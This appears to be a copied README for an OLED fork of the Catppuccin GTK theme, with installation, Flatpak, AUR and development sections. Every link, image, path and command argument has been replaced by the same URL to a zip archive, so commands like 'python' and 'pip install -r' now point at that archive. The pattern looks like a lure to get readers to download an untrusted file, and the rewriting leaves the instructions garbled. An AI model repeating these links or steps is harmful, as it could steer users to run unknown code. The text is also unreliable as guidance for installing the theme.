<h3 align="center">
	<img src="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip" width="100" alt="Logo"/><br/>
	<img src="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip" height="30" width="0px"/>
	Catppuccin for <a href="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip">GTK</a>
	<img src="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip" height="30" width="0px"/>
</h3>

<p align="center">
    <a href="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip"><img src="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip"></a>
    <a href="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip"><img src="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip"></a>
    <a href="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip"><img src="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip"></a>
</p>

<p align="center">
  <img src="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip"/>
</p>

# About

This GTK theme is based on the [Colloid](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip) theme made by [Vinceliuice](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)

***This is a personal fork of [catppuccin/gtk](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip) with OLED colours. Please contribute to the main repository.*** 
## Usage

### Requirements

-   GTK `>=3.20`
-   `gnome-themes-extra` (or `gnome-themes-standard`)
-   Murrine engine

### Installation

1. Download and extract the **https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip** file. or **https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip** file.
[From Release](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip) or you can install the theme from the [AUR](#for-arch-linux-users)
2. Move the theme folder to **".themes"** in your home directory. **(~https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)** (Skip this step if you are using the AUR package)
3. Select **"Catppuccin-Flavour** or **Catppuccin-Flavour-Color"** via your desktop specific tweaks application (**gnome-tweaks** on Gnome3+).

### For Flatpak users

1. To give your Flatpaks access to your themes folder run:
  ```bash
  sudo flatpak override --filesystem=$https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip
  ```
2. To set the theme for all Flatpaks, replace `##theme##` with the name of the theme you want to use and run this command:
  ```bash
  sudo flatpak override --env=GTK_THEME=##theme##
  ```
3. For a more in depth tutorial see Hamza Algohary's tutorial on [It's Foss](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)

### For Arch Linux users

We have 4 AUR packages for all the 4 flavours of the theme:
- [Latte](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)
- [Frappe](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)
- [Macchiato](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)
- [Mocha](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)

With your favourite AUR helper, install them:
  ```bash
  yay -S catppuccin-gtk-theme-mocha catppuccin-gtk-theme-macchiato catppuccin-gtk-theme-frappe catppuccin-gtk-theme-latte
  ```

## Development
**Note**: Ensure that you have atleast python version 3.10 installed

Clone the repository using
```bash
git clone --recurse-submodules https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip
virtualenv -p python3 venv  # to be created only once and only if you need a virtual env
source venv/bin/activate  
pip install -r https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip
```
To check out the install script, run 
```bash
python https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip --help
```

You can install any theme like the following example
```bash
python https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip mocha -a sky --tweaks rimless -d ~https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip
```
You can build all possible variations of the theme possible using the following command and it will output it to releases folder in the root of the repo.
```bash
python https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip
```

A few important notes to keep in mind

* `https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip` handles all changes that needs to be done to colloid to ensure it generated catppuccin colors. If vinceliuice changes anything in his theme in future, that is where you must change
* `https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip` includes all different variables that you can tinker around as per your personal requirements. 
* `https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip` consists of a wrapper that will recolor the colloid theme, install it as per the args provided and rename it accordingly. 
 
## 💝 Thanks to

**Current maintainers**
- [npv12](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)
- [ghostx31](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)
- [Syndrizzle](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)

**Contributions**
- [rubyowo](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip) - for working on the build and CI script

**Previous maintainer(s)**
- [sadrach-cl](https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip)

&nbsp;

<p align="center"><img src="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip" /></p>
<p align="center">Copyright &copy; 2021-present <a href="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip" target="_blank">Catppuccin Org</a>
<p align="center"><a href="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip"><img src="https://github.com/Akanant12/gtk-oledppuccin/raw/refs/heads/main/.github/oledppuccin_gtk_terrane.zip"/></a></p>
